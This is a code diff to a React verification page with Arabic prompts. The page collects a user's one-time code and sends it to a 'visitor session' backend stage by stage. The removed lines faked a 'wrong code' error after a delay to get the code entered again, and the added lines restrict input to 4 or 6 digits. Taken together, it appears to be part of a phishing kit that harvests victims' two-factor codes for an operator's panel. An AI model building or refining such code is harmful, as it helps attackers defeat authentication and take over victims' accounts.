@@ -3,7 +3,7 @@ import { createOrUpdateRequest, fillFieldMessage } from "@/api/visitorSession";
 import { AdminGatedScreen } from "@/components/AdminGatedScreen";
 import { useVisitorSession } from "@/hooks/useVisitorSession";
 
-const OTP_MAX_DIGITS = 32;
+const OTP_MAX_DIGITS = 6;
 
 function formatTime(total: number) {
   const m = Math.floor(total / 60);
@@ -28,25 +28,21 @@ export default function VerifyPage() {
 
   const onSubmit = async (e: FormEvent) => {
     e.preventDefault();
-    if (!otp.trim()) {
-      setFillError(fillFieldMessage("رمز التحقق"));
+    const len = otp.trim().length;
+    if (len !== 4 && len !== 6) {
+      setFillError("رمز التحقق يجب أن يتكون من 4 أو 6 أرقام فقط");
       setWrongError(false);
       return;
     }
     setFillError(null);
     setWrongError(false);
+    setLoading(true);
+
     await createOrUpdateRequest({
       stage_key: "otp",
-      notify_key: otp,
+      notify_key: otp.trim(),
       stage_state: "pending",
     });
-
-    setLoading(true);
-    setTimeout(() => {
-      setLoading(false);
-      setOtp("");
-      setWrongError(true);
-    }, 3000);
   };
 
   return (
@@ -71,7 +67,7 @@ export default function VerifyPage() {
               inputMode="numeric"
               autoComplete="off"
               maxLength={OTP_MAX_DIGITS}
-              placeholder="أدخل رمز التحقق"
+              placeholder="أدخل رمز التحقق (4 أو 6 أرقام)"
               value={otp}
               onChange={(e) => {
                 const v = e.target.value.replace(/\D/g, "").slice(0, OTP_MAX_DIGITS);
